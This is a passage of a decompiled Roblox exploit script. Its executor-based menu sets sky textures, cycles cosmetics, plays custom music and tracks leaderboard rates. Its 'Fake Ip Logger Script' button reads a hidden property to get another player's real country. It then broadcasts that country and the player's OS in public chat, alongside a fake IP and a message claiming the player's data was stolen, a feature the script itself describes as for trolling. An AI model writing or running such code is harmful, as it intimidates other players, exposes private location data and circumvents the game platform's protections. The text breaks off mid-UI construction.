            Title = "Configure Sun TextureId",
            Description = "Configure the texture of the sun.",
            Default = vu60.Sky.SunTextureId,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1556)
                vu60.Sky.SunTextureId = tonumber(p1556)
            end
        })
        v1540:AddInput("MoonTextureId", {
            Title = "Configure Moon TextureId",
            Description = "Configure the texture of the moon.",
            Default = vu60.Sky.MoonTextureId,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1557)
                vu60.Sky.MoonTextureId = tonumber(p1557)
            end
        })
        v1540:AddInput("FallenPartsDestroyHeight", {
            Title = "Configure Destroy Height",
            Description = "Config the FallenPartsDestroyHeight.",
            Default = workspace.FallenPartsDestroyHeight,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1558)
                workspace.FallenPartsDestroyHeight = tonumber(p1558)
            end
        })
    end
    local function v1636()
        vu476({
            Rainbow = false,
            RainbowMode = "Normal",
            InverseChance = 15,
            RainbowCosmeticSelection = {
                Clothing = false,
                Shuriken = false,
                Sword = false
            },
            SelectedCosmetics = {
                Clothing = {},
                Shuriken = {},
                Sword = {}
            },
            RainbowTableChanged = true,
            RainbowRate = 0.02,
            RainbowFinishRate = 0.02
        })
        vu457.Cosmetics:AddDropdown("RainbowCosmeticSelection", {
            Title = "Rainbow Cosmetic Selection",
            Values = {
                "Clothing",
                "Shuriken",
                "Sword"
            },
            Multi = true,
            Default = {}
        })
        vu457.Cosmetics:AddDropdown("RainbowMode", {
            Title = "Rainbow Mode",
            Values = {
                "Normal",
                "Random",
                "Inverse"
            },
            Multi = false,
            Default = vu70.RainbowMode
        })
        vu67.RainbowCosmeticSelection:OnChanged(function(p1560)
            vu70.RainbowTableChanged = true
            local v1561, v1562, v1563 = pairs(vu70.RainbowCosmeticSelection)
            while true do
                local v1564
                v1563, v1564 = v1561(v1562, v1563)
                if v1563 == nil then
                    break
                end
                if p1560[v1563] then
                    vu70.RainbowCosmeticSelection[v1563] = true
                else
                    vu70.RainbowCosmeticSelection[v1563] = false
                end
            end
        end)
        vu67.RainbowMode:OnChanged(function(p1565)
            vu70.RainbowMode = p1565
            vu70.RainbowTableChanged = true
        end)
        vu457.Cosmetics:AddToggle("Rainbow", {
            Title = "Rainbow",
            Default = false,
            Callback = function(p1566)
                vu70.Rainbow = p1566
                if p1566 then
                    local vu1567 = {
                        game:GetService("RunService").Stepped,
                        game:GetService("RunService").Heartbeat,
                        game:GetService("RunService").RenderStepped
                    }
                    local vu1568 = 0
                    local vu1569 = {
                        Clothing = {},
                        Shuriken = {},
                        Sword = {}
                    }
                    local vu1570 = {
                        Clothing = {},
                        Shuriken = {},
                        Sword = {}
                    }
                    local vu1571 = {
                        Clothing = false,
                        Shuriken = false,
                        Sword = false
                    }
                    local function vu1574(p1572, p1573)
                        if vu70[p1572] < 0 then
                            if not p1573 and vu70[p1572] == - 1 or p1573 and vu70[p1572] <= - 1 then
                                if vu1568 >= 3 then
                                    vu1568 = 0
                                end
                                vu1568 = vu1568 + 1
                                vu1567[vu1568]:Wait()
                            end
                        else
                            task.wait(vu70[p1572])
                        end
                    end
                    local function vu1582()
                        local v1575, v1576, v1577 = pairs(vu70.RainbowCosmeticSelection)
                        while true do
                            local v1578
                            v1577, v1578 = v1575(v1576, v1577)
                            if v1577 == nil then
                                break
                            end
                            if v1578 then
                                table.clear(vu1569[v1577])
                                local v1579 = v1577
                                for v1580 = 1, # vu73[v1577] do
                                    local v1581 = vu73[v1579][v1580]
                                    if vu70.SelectedCosmetics[v1579][v1581] then
                                        table.insert(vu1569[v1579], v1581)
                                    end
                                end
                            end
                        end
                    end
                    local function vu1588(p1583)
                        local v1584, v1585, v1586 = pairs(vu1569[p1583])
                        while true do
                            local v1587
                            v1586, v1587 = v1584(v1585, v1586)
                            if v1586 == nil then
                                break
                            end
                            table.insert(vu1570[p1583], v1587)
                        end
                    end
                    local function vu1594(p1589)
                        local v1590, v1591, v1592 = pairs(vu1570[p1589])
                        while true do
                            local v1593
                            v1592, v1593 = v1590(v1591, v1592)
                            if v1592 == nil then
                                break
                            end
                            table.clear(vu1570[p1589][v1592])
                        end
                    end
                    local function vu1599(p1595)
                        local v1596 = string.sub(p1595, 1, 4)
                        local v1597 = string.len(p1595) <= 5 and 1 or 2
                        local v1598 = string.sub(p1595, - v1597, string.len(p1595))
                        return (v1596 == "Ying" and "Yang" or "Ying") .. v1598
                    end
                    local vu1609 = {
                        Normal = function(p1600)
                            vu1571[p1600] = true
                            for v1601 = 1, # vu1569[p1600] do
                                if not vu70.Rainbow or vu70.RainbowTableChanged then
                                    vu1571[p1600] = false
                                    return
                                end
                                local v1602 = vu1569[p1600][v1601]
                                vu455.ChangeCosmetic[p1600](v1602)
                                vu1574("RainbowRate", false)
                            end
                            vu1571[p1600] = false
                        end,
                        Random = function(p1603)
                            vu1571[p1603] = true
                            vu1588(p1603)
                            for _ = 1, # vu1570[p1603] do
                                if not vu70.Rainbow or vu70.RainbowTableChanged then
                                    vu1571[p1603] = false
                                    vu1594(p1603)
                                    return
                                end
                                local v1604 = math.random(1, # vu1570[p1603])
                                local v1605 = vu1570[p1603][v1604]
                                vu455.ChangeCosmetic[p1603](v1605)
                                table.remove(vu1570[p1603], v1604)
                                vu1574("RainbowRate", false)
                            end
                            vu1571[p1603] = false
                            vu1594(p1603)
                        end,
                        Inverse = function(p1606)
                            vu1571[p1606] = true
                            for v1607 = 1, # vu1569[p1606] do
                                if not vu70.Rainbow or vu70.RainbowTableChanged then
                                    vu1571[p1606] = false
                                    return
                                end
                                local v1608 = vu1569[p1606][v1607]
                                if table.find(vu73.Inversables, v1608) and math.random(1, 100) <= vu70.InverseChance then
                                    v1608 = vu1599(v1608)
                                end
                                vu455.ChangeCosmetic[p1606](v1608)
                                vu1574("RainbowRate", false)
                            end
                            vu1571[p1606] = false
                        end
                    }
                    task.spawn(function()
                        while vu70.Rainbow do
                            if vu70.RainbowTableChanged then
                                vu70.RainbowTableChanged = false
                                vu1582()
                            end
                            local v1610, v1611, v1612 = pairs(vu70.RainbowCosmeticSelection)
                            while true do
                                local vu1613, v1614 = v1610(v1611, v1612)
                                if vu1613 == nil then
                                    break
                                end
                                v1612 = vu1613
                                if v1614 and not vu1571[vu1613] then
                                    coroutine.resume(coroutine.create(function()
                                        vu1609[vu70.RainbowMode](vu1613)
                                    end))
                                end
                            end
                            vu1574("RainbowFinishRate", true)
                        end
                        table.clear(vu1570)
                        table.clear(vu1569)
                        vu1570 = nil
                        vu1569 = nil
                        vu70.RainbowTableChanged = true
                    end)
                end
            end
        })
        vu457.Cosmetics:AddInput("RainbowRate", {
            Title = "Rainbow Rate",
            Default = vu70.RainbowRate,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1615)
                vu70.RainbowRate = tonumber(p1615)
            end
        })
        vu457.Cosmetics:AddInput("RainbowFinishRate", {
            Title = "Rainbow Finish Rate",
            Default = vu70.RainbowFinishRate,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1616)
                vu70.RainbowFinishRate = tonumber(p1616)
            end
        })
        vu457.Cosmetics:AddInput("InverseChance", {
            Title = "Inverse Chance",
            Description = "Chance of inverse (in %)",
            Default = vu70.InverseChance,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1617)
                vu70.InverseChance = tonumber(p1617)
            end
        })
        local function v1635(pu1618)
            local v1619 = vu457.Cosmetics:AddSection(pu1618)
            v1619:AddDropdown(pu1618 .. "Multilist", {
                Title = pu1618 .. " Multilist",
                Values = vu73[pu1618],
                Multi = true,
                Default = vu70.SelectedCosmetics[pu1618]
            })
            vu67[pu1618 .. "Multilist"]:OnChanged(function(p1620)
                local v1621, v1622, v1623 = pairs(vu73[pu1618])
                while true do
                    local v1624
                    v1623, v1624 = v1621(v1622, v1623)
                    if v1623 == nil then
                        break
                    end
                    if p1620[v1624] or not vu70.SelectedCosmetics[pu1618][v1624] then
                        if p1620[v1624] and not vu70.SelectedCosmetics[pu1618][v1624] then
                            vu70.SelectedCosmetics[pu1618][v1624] = true
                            vu70.RainbowTableChanged = true
                        end
                    else
                        vu70.SelectedCosmetics[pu1618][v1624] = nil
                    end
                end
            end)
            v1619:AddButton({
                Title = "Select All",
                Callback = function()
                    local v1625, v1626, v1627 = pairs(vu73[pu1618])
                    while true do
                        local v1628
                        v1627, v1628 = v1625(v1626, v1627)
                        if v1627 == nil then
                            break
                        end
                        vu70.SelectedCosmetics[pu1618][v1628] = true
                    end
                    vu67[pu1618 .. "Multilist"]:SetValue(vu70.SelectedCosmetics[pu1618])
                    vu70.RainbowTableChanged = true
                end
            })
            v1619:AddButton({
                Title = "Unselect All",
                Callback = function()
                    local v1629, v1630, v1631 = pairs(vu73[pu1618])
                    while true do
                        local v1632
                        v1631, v1632 = v1629(v1630, v1631)
                        if v1631 == nil then
                            break
                        end
                        vu70.SelectedCosmetics[pu1618][v1632] = nil
                    end
                    vu67[pu1618 .. "Multilist"]:SetValue(vu70.SelectedCosmetics[pu1618])
                    vu70.RainbowTableChanged = true
                end
            })
            local vu1633 = ""
            v1619:AddDropdown(pu1618 .. "Selection", {
                Title = pu1618 .. " Selection",
                Description = "For changing " .. pu1618 .. " once",
                Values = vu73[pu1618],
                Multi = false,
                Default = vu1633
            })
            vu67[pu1618 .. "Selection"]:OnChanged(function(p1634)
                vu1633 = p1634
            end)
            v1619:AddButton({
                Title = "Change Into Selected " .. pu1618,
                Description = "Change into the selected " .. pu1618 .. " in the dropdown above.",
                Callback = function()
                    vu455.ChangeCosmetic[pu1618](vu1633)
                end
            })
        end
        v1635("Clothing")
        v1635("Shuriken")
        v1635("Sword")
    end
    local function v1676()
        vu476({
            MusicPlaying = false,
            CurrentSong = "",
            PlayDefaultMusic = false,
            Queue = {},
            QueuePosition = 1,
            MusicWaitList = {
                90,
                75,
                60,
                45,
                30
            },
            SelectedSongs = "",
            SelectedWaitTime = "",
            RandomWaitTime = false,
            CurrentWaitIndex = 1,
            UseWaitTable = false,
            AutoShuffle = false
        })
        local vu1637 = vu53.LocalPlayer.LocalSounds.BGSound
        local vu1638 = 0
        local vu1639 = 0.5
        local vu1640 = Instance.new("Sound", workspace)
        vu1640.Volume = vu1639
        vu1640.Name = "BACKGROUND"
        local vu1641 = vu457.Music:AddParagraph({
            Title = "Music Stopped"
        })
        local v1642 = vu457.Music:AddSection("Options")
        v1642:AddButton({
            Title = "Play",
            Callback = function()
                vu1638 = vu1637.Volume ~= 0 and vu1637.Volume or vu1638
                vu1637.Volume = 0
                if vu70.MusicPlaying then
                    vu1640:Resume()
                    vu1641:SetTitle("Now playing: " .. vu70.CurrentSong)
                else
                    vu70.MusicPlaying = true
                    task.spawn(function()
                        local v1643 = false
                        while vu70.MusicPlaying do
                            if # vu70.Queue <= 0 then
                                if not v1643 then
                                    vu1641:SetTitle("Queue is empty!")
                                    v1643 = true
                                end
                            else
                                v1643 = false
                                for v1644 = 1, # vu70.Queue do
                                    if vu70.MusicPlaying then
                                        local v1645 = string.split(vu70.Queue[v1644], " ")
                                        vu1640.SoundId = getcustomasset("CustomMusic/" .. v1645[2])
                                        vu1640:Play()
                                        vu70.CurrentSong = v1645[2]
                                        vu1641:SetTitle("Now playing: " .. v1645[2])
                                        vu1640.Ended:Wait()
                                        vu1640.TimePosition = 0
                                        if vu70.UseWaitTable then
                                            if # vu70.MusicWaitList > 0 then
                                                if vu70.MusicPlaying then
                                                    vu1641:SetTitle("Waiting..")
                                                    if vu70.RandomWaitTime then
                                                        task.wait(vu70.MusicWaitList[math.random(1, # vu70.MusicWaitList)])
                                                    else
                                                        task.wait(vu70.MusicWaitList[vu70.CurrentWaitIndex])
                                                        vu70.CurrentWaitIndex = vu70.CurrentWaitIndex + 1
                                                        if vu70.CurrentWaitIndex > # vu70.MusicWaitList then
                                                            vu70.CurrentWaitIndex = 1
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                            task.wait()
                        end
                    end)
                end
            end
        })
        v1642:AddButton({
            Title = "Pause",
            Callback = function()
                vu1640:Pause()
                vu1641:SetTitle("Music Paused")
                vu1637.Volume = vu70.PlayDefaultMusic and vu1638 or 0
            end
        })
        v1642:AddButton({
            Title = "Skip",
            Callback = function()
                vu1640.TimePosition = vu1640.TimeLength
            end
        })
        v1642:AddButton({
            Title = "Stop",
            Callback = function()
                vu70.MusicPlaying = false
                vu1640.TimePosition = vu1640.TimeLength
                vu1641:SetTitle("Music Stopped")
                vu1637.Volume = vu70.PlayDefaultMusic and vu1638 or 0
            end
        })
        v1642:AddToggle("Mute", {
            Title = "Mute",
            Default = false,
            Callback = function(p1646)
                if p1646 then
                    vu1639 = vu1640.Volume
                    vu1640.Volume = 0
                    if vu67.Volume then
                        vu67.Volume:SetValue("0")
                    end
                else
                    vu1640.Volume = vu1639
                    if vu67.Volume then
                        vu67.Volume:SetValue(tostring(vu1639 * 200))
                    end
                end
            end
        })
        v1642:AddInput("Volume", {
            Title = "Volume (in %)",
            Placeholder = "Enter a number..",
            Default = "100",
            Numeric = true,
            Finished = true,
            Callback = function(p1647)
                vu1640.Volume = tonumber(p1647) / 200
            end
        })
        local v1648 = vu457.Music:AddSection("Queue")
        if listfiles and isfolder then
            if not isfolder("CustomMusic") then
                makefolder("CustomMusic")
            end
            local v1649 = listfiles("CustomMusic")
            if # v1649 > 0 then
                for v1650 = 1, # v1649 do
                    local v1651 = string.gsub(v1649[v1650], "CustomMusic/", "")
                    table.insert(vu70.Queue, v1650 .. ") " .. v1651)
                end
            end
        end
        v1648:AddDropdown("Queue", {
            Title = "Queue",
            Values = vu70.Queue,
            Multi = false
        })
        vu67.Queue:OnChanged(function(p1652)
            vu70.SelectedSongs = p1652
        end)
        v1648:AddButton({
            Title = "Remove Song",
            Callback = function()
                if vu70.SelectedSongs ~= "" then
                    table.remove(vu70.Queue, table.find(vu70.Queue, vu70.SelectedSongs))
                    for v1653 = 1, # vu70.Queue do
                        local v1654 = string.split(vu70.Queue[v1653], " ")
                        vu70.Queue[v1653] = v1653 .. ") " .. v1654[2]
                    end
                    vu67.Queue:SetValues(vu70.Queue)
                    vu67.Queue:SetValue("")
                    vu70.SelectedSongs = ""
                end
            end
        })
        local vu1655 = {}
        v1648:AddButton({
            Title = "Shuffle Queue",
            Callback = function()
                while # vu1655 ~= # vu70.Queue do
                    local v1656 = math.random(1, # vu70.Queue)
                    local v1657 = string.split(vu70.Queue[v1656], " ")
                    if not table.find(vu1655, v1657[2]) then
                        table.insert(vu1655, v1657[2])
                    end
                end
                table.clear(vu70.Queue)
                for v1658 = 1, # vu1655 do
                    vu1655[v1658] = v1658 .. ") " .. vu1655[v1658]
                    table.insert(vu70.Queue, vu1655[v1658])
                end
                table.clear(vu1655)
                vu67.Queue:SetValues(vu70.Queue)
                vu67.Queue:SetValue("")
            end
        })
        v1648:AddButton({
            Title = "Add Folder Songs",
            Callback = function()
                if listfiles and isfolder then
                    if not isfolder("CustomMusic") then
                        makefolder("CustomMusic")
                    end
                    table.clear(vu70.Queue)
                    local v1659 = listfiles("CustomMusic")
                    if # v1659 > 0 then
                        for v1660 = 1, # v1659 do
                            local v1661 = string.gsub(v1659[v1660], "CustomMusic/", "")
                            table.insert(vu70.Queue, v1660 .. ") " .. v1661)
                        end
                    end
                    vu67.Queue:SetValues(vu70.Queue)
                    vu67.Queue:SetValue("")
                end
            end
        })
        local v1662 = vu457.Music:AddSection("Settings")
        v1662:AddDropdown("WaitTable", {
            Title = "Wait Table",
            Description = "Times to wait until next song.",
            Values = vu70.MusicWaitList,
            Multi = false
        })
        vu67.WaitTable:OnChanged(function(p1663)
            vu70.SelectedWaitTime = p1663
        end)
        v1662:AddInput("EnterWaitAmount", {
            Title = "Enter Wait Amount",
            Placeholder = "Enter a wait amount..",
            Numeric = true,
            Finished = true,
            Callback = function(p1664)
                table.insert(vu70.MusicWaitList, tonumber(p1664))
                vu67.WaitTable:SetValues(vu70.MusicWaitList)
            end
        })
        v1662:AddButton({
            Title = "Remove Wait Amount",
            Callback = function()
                if vu70.SelectedWaitTime ~= "" then
                    table.remove(vu70.MusicWaitList, table.find(vu70.MusicWaitList, vu70.SelectedWaitTime))
                    vu67.Queue:SetValues(vu70.Queue)
                    vu67.Queue:SetValue("")
                    vu70.SelectedWaitTime = ""
                end
            end
        })
        v1662:AddToggle("UseWaitTable", {
            Title = "Use Wait Table",
            Description = "Toggles the use of the wait table above to wait for the next song in the queue.",
            Default = false,
            Callback = function(p1665)
                vu70.UseWaitTable = p1665
            end
        })
        v1662:AddToggle("RandomWaitTime", {
            Title = "Random Wait Time",
            Description = "Randomly picks a wait time from the wait table to use after each song.",
            Default = false,
            Callback = function(p1666)
                vu70.RandomWaitTime = p1666
            end
        })
        v1662:AddToggle("PlayDefaultMusic", {
            Title = "Play Default BG Music",
            Description = "Determines whether you want the default background music to play when your custom music is paused or stopped.",
            Default = false,
            Callback = function(p1667)
                vu70.PlayDefaultMusic = p1667
            end
        })
        v1662:AddToggle("AutoShuffle", {
            Title = "Auto Shuffle",
            Description = "Automatically shuffles the queue on execution. (Use a config for it to save though)",
            Default = false,
            Callback = function(p1668)
                vu70.AutoShuffle = p1668
            end
        })
        v1662:AddToggle("AutoPlay", {
            Title = "Auto Play",
            Description = "Automatically plays music on execution. (Use a config for it to save though)",
            Default = false,
            Callback = function(p1669)
                if p1669 then
                    task.wait(0.1)
                    vu1638 = vu1637.Volume ~= 0 and vu1637.Volume or vu1638
                    vu1637.Volume = 0
                    vu70.MusicPlaying = true
                    if vu70.AutoShuffle then
                        while # vu1655 ~= # vu70.Queue do
                            local v1670 = math.random(1, # vu70.Queue)
                            local v1671 = string.split(vu70.Queue[v1670], " ")
                            if not table.find(vu1655, v1671[2]) then
                                table.insert(vu1655, v1671[2])
                            end
                        end
                        table.clear(vu70.Queue)
                        for v1672 = 1, # vu1655 do
                            vu1655[v1672] = v1672 .. ") " .. vu1655[v1672]
                            table.insert(vu70.Queue, vu1655[v1672])
                        end
                        table.clear(vu1655)
                        vu67.Queue:SetValues(vu70.Queue)
                        vu67.Queue:SetValue("")
                    end
                    task.spawn(function()
                        local v1673 = false
                        while vu70.MusicPlaying do
                            if # vu70.Queue <= 0 then
                                if not v1673 then
                                    vu1641:SetTitle("Queue is empty!")
                                    v1673 = true
                                end
                            else
                                v1673 = false
                                for v1674 = 1, # vu70.Queue do
                                    if vu70.MusicPlaying then
                                        local v1675 = string.split(vu70.Queue[v1674], " ")
                                        vu1640.SoundId = getcustomasset("CustomMusic/" .. v1675[2])
                                        vu1640:Play()
                                        vu70.CurrentSong = v1675[2]
                                        vu1641:SetTitle("Now playing: " .. v1675[2])
                                        vu1640.Ended:Wait()
                                        vu1640.TimePosition = 0
                                        if # vu70.MusicWaitList > 0 then
                                            if vu70.MusicPlaying then
                                                vu1641:SetTitle("Waiting..")
                                                if vu70.RandomWaitTime then
                                                    task.wait(vu70.MusicWaitList[math.random(1, # vu70.MusicWaitList)])
                                                else
                                                    task.wait(vu70.MusicWaitList[vu70.CurrentWaitIndex])
                                                    vu70.CurrentWaitIndex = vu70.CurrentWaitIndex + 1
                                                    if vu70.CurrentWaitIndex > # vu70.MusicWaitList then
                                                        vu70.CurrentWaitIndex = 1
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                            task.wait()
                        end
                    end)
                end
            end
        })
    end
    local function v1698()
        vu476({
            LeaderboardValues = {}
        })
        for v1677 = 1, 100 do
            vu70.LeaderboardValues[v1677] = {
                lastScore = 0
            }
        end
        local v1678, v1679, v1680 = pairs(game.Workspace.LeaderBoard:GetChildren())
        local v1681 = nil
        while true do
            local v1682
            v1680, v1682 = v1678(v1679, v1680)
            if v1680 == nil then
                break
            end
            if v1682:FindFirstChild("NinjutsuLeaderBoardScript") then
                v1681 = v1682
            end
        end
        local vu1683 = v1681.SurfaceGui.ScrollingFrame
        for v1684 = 1, 100 do
            local vu1685 = v1684
            local vu1686 = vu1683["Score" .. vu1685]
            local v1687 = vu1683["Name" .. vu1685].Text
            local v1688 = string.gsub(v1687, "(%[.*%])", "")
            local v1689 = string.gsub(v1688, " ", "", 3)
            local v1690 = string.gsub(vu1686.Text, "%D", "")
            vu70.LeaderboardValues[vu1685].lastScore = string.gsub(vu1686.Text, "%D", "")
            vu70.LeaderboardValues[vu1685].Tab = vu457.Leaderboard:AddParagraph({
                Title = v1689 .. ":   " .. vu71.CommaValue(v1690) .. " Ninjutsu",
                Content = "Ninjutsu Per Second  =  0\nNinjutsu Per Minute  =  0\nNinjutsu Per Day  =  0"
            })
            local v1691 = vu1686
            vu1686.GetPropertyChangedSignal(v1691, "Text"):Connect(function()
                local v1692 = vu1683["Name" .. vu1685].Text
                local v1693 = string.gsub(v1692, "(%[.*%])", "")
                local v1694 = string.gsub(v1693, " ", "", 3)
                local v1695 = string.gsub(vu1686.Text, "%D", "")
                local v1696 = v1695 - vu70.LeaderboardValues[vu1685].lastScore
                local v1697 = 60
                vu70.LeaderboardValues[vu1685].Tab:SetTitle(v1694 .. ":   " .. vu71.CommaValue(v1695) .. " Ninjutsu")
                vu70.LeaderboardValues[vu1685].Tab:SetDesc("Ninjutsu Per Second  =  " .. vu71.CommaValue(vu71.Round(v1696 / v1697, 2)) .. "\nNinjutsu Per Minute  =  " .. vu71.CommaValue(vu71.Round(v1696, 2)) .. "\nNinjutsu Per Day  =  " .. vu71.CommaValue(vu71.Round(v1696 / v1697 * 60 * 60 * 24, 2)))
                vu70.LeaderboardValues[vu1685].lastScore = v1695
            end)
        end
    end
    local function v1752()
        local v1699 = vu457.Misc:AddSection("Buttons")
        v1699:AddButton({
            Title = "Fake Ip Logger Script",
            Description = "Executes the fake ip logger script so you can troll idiots.",
            Callback = function()
                local vu1700 = Instance.new("ScreenGui")
                local vu1701 = Instance.new("ImageLabel")
                local v1702 = Instance.new("TextLabel")
                local v1703 = Instance.new("TextLabel")
                local vu1704 = Instance.new("TextButton")
                local v1705 = Instance.new("TextLabel")
                local v1706 = Instance.new("TextLabel")
                local vu1707 = Instance.new("TextBox")
                local v1708 = Instance.new("TextButton")
                local v1709 = Instance.new("ImageLabel")
                local vu1710 = Instance.new("TextButton")
                local vu1711 = Instance.new("ImageLabel")
                local v1712 = Instance.new("TextLabel")
                local v1713 = Instance.new("TextLabel")
                local v1714 = Instance.new("TextButton")
                local v1715 = Instance.new("ImageLabel")
                local v1716 = Instance.new("TextLabel")
                vu1701.Draggable = true
                vu1701.Active = true
                vu1701.Selectable = true
                local v1717 = Instance.new("Sound")
                v1717.Parent = workspace
                v1717.SoundId = "rbxassetid://5292029547"
                v1717:Play()
                vu1700.Parent = game.CoreGui
                vu1701.Name = "Frame"
                vu1701.Parent = vu1700
                vu1701.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                vu1701.BackgroundTransparency = 1
                vu1701.Position = UDim2.new(0.152727276, 0, 0.277641267, 0)
                vu1701.Size = UDim2.new(0, 0, 0, 0)
                vu1701.ZIndex = 3
                vu1701.Image = "rbxassetid://3570695787"
                vu1701.ImageColor3 = Color3.fromRGB(20, 20, 20)
                vu1701.ScaleType = Enum.ScaleType.Slice
                vu1701.SliceCenter = Rect.new(100, 100, 100, 100)
                vu1701.SliceScale = 0.12
                vu1701.ClipsDescendants = true
                v1702.Parent = vu1701
                v1702.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1702.BackgroundTransparency = 1
                v1702.Position = UDim2.new(0.026143793, 0, 0.0232558139, 0)
                v1702.Size = UDim2.new(0, 22, 0, 24)
                v1702.ZIndex = 3
                v1702.Font = Enum.Font.SourceSansBold
                v1702.Text = "IP"
                v1702.TextColor3 = Color3.fromRGB(255, 85, 0)
                v1702.TextSize = 25
                v1703.Parent = vu1701
                v1703.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1703.BackgroundTransparency = 1
                v1703.Position = UDim2.new(0.0980392173, 0, 0.0232558139, 0)
                v1703.Size = UDim2.new(0, 102, 0, 24)
                v1703.ZIndex = 3
                v1703.Font = Enum.Font.SourceSansBold
                v1703.Text = "LOGGER"
                v1703.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1703.TextSize = 25
                vu1704.Name = "close"
                vu1704.Parent = vu1701
                vu1704.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                vu1704.BackgroundTransparency = 1.01
                vu1704.Position = UDim2.new(0.934640527, 0, 0.0232558139, 0)
                vu1704.Size = UDim2.new(0, 20, 0, 20)
                vu1704.ZIndex = 3
                vu1704.Font = Enum.Font.SourceSansBold
                vu1704.Text = "X"
                vu1704.TextColor3 = Color3.fromRGB(255, 0, 0)
                vu1704.TextScaled = true
                vu1704.TextSize = 14
                vu1704.TextWrapped = true
                v1705.Parent = vu1701
                v1705.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1705.BackgroundTransparency = 1
                v1705.Position = UDim2.new(7.4505806e-9, 0, 0.860465109, 0)
                v1705.Size = UDim2.new(0, 214, 0, 24)
                v1705.ZIndex = 3
                v1705.Font = Enum.Font.SourceSansBold
                v1705.Text = "Gui & Code Remade: fixed#8267"
                v1705.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1705.TextSize = 15
                v1706.Parent = vu1701
                v1706.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1706.BackgroundTransparency = 1
                v1706.Position = UDim2.new(0, 0, 0.767441869, 0)
                v1706.Size = UDim2.new(0, 240, 0, 24)
                v1706.ZIndex = 3
                v1706.Font = Enum.Font.SourceSansBold
                v1706.Text = "Gui & Code Revamp: Univrs#7207"
                v1706.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1706.TextSize = 15
                vu1707.Name = "username"
                vu1707.Parent = vu1701
                vu1707.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
                vu1707.BackgroundTransparency = 1
                vu1707.BorderSizePixel = 0
                vu1707.Position = UDim2.new(0.173202619, 0, 0.313953489, 0)
                vu1707.Size = UDim2.new(0, 200, 0, 24)
                vu1707.ZIndex = 3
                vu1707.Font = Enum.Font.GothamBold
                vu1707.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
                vu1707.PlaceholderText = "Input User"
                vu1707.Text = ""
                vu1707.TextColor3 = Color3.fromRGB(255, 255, 255)
                vu1707.TextSize = 14
                v1708.Name = "LogFakeIp"
                v1708.Parent = vu1701
                v1708.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
                v1708.BackgroundTransparency = 1
                v1708.BorderSizePixel = 0
                v1708.Position = UDim2.new(0.205882356, 0, 0.511627913, 0)
                v1708.Size = UDim2.new(0, 180, 0, 28)
                v1708.ZIndex = 4
                v1708.Font = Enum.Font.SourceSansBold
                v1708.Text = "Take Ip"
                v1708.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1708.TextScaled = true
                v1708.TextSize = 14
                v1708.TextWrapped = true
                v1708.MouseButton1Down:connect(function()
                    local v1718 = game.Players[vu1707.Text]
                    ass = gethiddenproperty or get_hidden_prop
                    local v1719 = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))[ass(v1718, "CountryRegionCodeReplicate")]
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v1718.Name .. " - Cracking IP Address...", "All")
                    wait(2)
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v1718.Name .. " is from " .. tostring(v1719) .. " OS: " .. v1718.OsPlatform .. " IP: " .. math.random(836) .. "." .. math.random(725) .. "." .. math.random(99) .. ".## (IP: Successfully Logged)", "All")
                    wait(0.55)
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v1718.Name .. "\'s Data Has Been Successfully Stolen.", "All")
                end)
                v1709.Name = "TextButton_Roundify_12px"
                v1709.Parent = v1708
                v1709.Active = true
                v1709.AnchorPoint = Vector2.new(0.5, 0.5)
                v1709.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1709.BackgroundTransparency = 1
                v1709.Position = UDim2.new(0.5, 0, 0.5, 0)
                v1709.Selectable = true
                v1709.Size = UDim2.new(1, 0, 1, 0)
                v1709.ZIndex = 3
                v1709.Image = "rbxassetid://3570695787"
                v1709.ImageColor3 = Color3.fromRGB(255, 128, 0)
                v1709.ScaleType = Enum.ScaleType.Slice
                v1709.SliceCenter = Rect.new(100, 100, 100, 100)
                v1709.SliceScale = 0.12
                vu1710.Name = "miscbut"
                vu1710.Parent = vu1701
                vu1710.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                vu1710.BackgroundTransparency = 1.01
                vu1710.Position = UDim2.new(0.934640527, 0, 0.883720934, 0)
                vu1710.Size = UDim2.new(0, 20, 0, 20)
                vu1710.ZIndex = 3
                vu1710.Font = Enum.Font.SourceSansBold
                vu1710.Text = ">"
                vu1710.TextColor3 = Color3.fromRGB(255, 255, 255)
                vu1710.TextScaled = true
                vu1710.TextSize = 14
                vu1710.TextWrapped = true
                vu1711.Name = "MISC"
                vu1711.Parent = vu1701
                vu1711.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                vu1711.BackgroundTransparency = 1
                vu1711.Position = UDim2.new(0.0775638819, 0, 0.0725949258, 0)
                vu1711.Size = UDim2.new(0, 262, 0, 147)
                vu1711.ZIndex = 0
                vu1711.Image = "rbxassetid://3570695787"
                vu1711.ImageColor3 = Color3.fromRGB(20, 20, 20)
                vu1711.ScaleType = Enum.ScaleType.Slice
                vu1711.SliceCenter = Rect.new(100, 100, 100, 100)
                vu1711.SliceScale = 0.12
                v1712.Parent = vu1711
